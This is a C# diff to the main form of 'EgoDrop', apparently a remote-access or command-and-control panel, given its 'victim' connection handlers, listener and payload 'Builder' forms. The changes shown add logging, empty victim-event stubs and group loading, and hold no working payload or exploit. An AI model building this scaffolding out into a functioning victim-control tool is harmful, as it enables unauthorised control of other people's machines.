@@ -1,3 +1,5 @@
+using System.Net.Sockets;
+
 namespace EgoDrop
 {
     public partial class frmMain : Form
@@ -17,9 +19,51 @@ namespace EgoDrop
 
         private clsVictim fnGetVictimFromTag(ListViewItem item) => (clsVictim)item.Tag;
 
+        #region Logger
+
+        public void fnSysLog(string szMsg)
+        {
+            richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] {szMsg}");
+            richTextBox1.AppendText(Environment.NewLine);
+        }
+
+        #endregion
+
+        public void fnOnNewVictim(clsListener ltn, clsVictim vic)
+        {
+            Socket sktClnt = vic.m_sktClnt;
+            try
+            {
+                Invoke(new Action(() =>
+                {
+                    
+                }));
+            }
+            catch (Exception ex)
+            {
+
+            }
+        }
+
+        public void fnReceivedMessage(clsListener ltn, clsVictim vic, List<string> lsMsg)
+        {
+
+        }
+
+        public void fnOnVictimDisconnected(clsListener ltn, clsVictim vic)
+        {
+
+        }
+
         private void fnSetup()
         {
-            //Load target groups
+            //Load groups
+            List<string> lsGroup = m_sqlite.fnlsGetGroups();
+            foreach (string szName in lsGroup)
+            {
+                TreeNode node = new TreeNode(szName);
+                treeView1.Nodes.Add(node);
+            }
         }
 
         private void frmMain_Load(object sender, EventArgs e)
@@ -30,7 +74,7 @@ namespace EgoDrop
         //Listener
         private void toolStripMenuItem1_Click(object sender, EventArgs e)
         {
-            frmListener f = new frmListener(m_sqlite, m_dicListener);
+            frmListener f = new frmListener(this, m_sqlite, m_dicListener);
 
             f.ShowDialog();
         }
@@ -38,7 +82,7 @@ namespace EgoDrop
         //Builder
         private void toolStripMenuItem2_Click(object sender, EventArgs e)
         {
-            frmBuilder f = new frmBuilder();
+            frmBuilder f = new frmBuilder(this, m_sqlite, m_iniMgr);
             f.Show();
         }
 
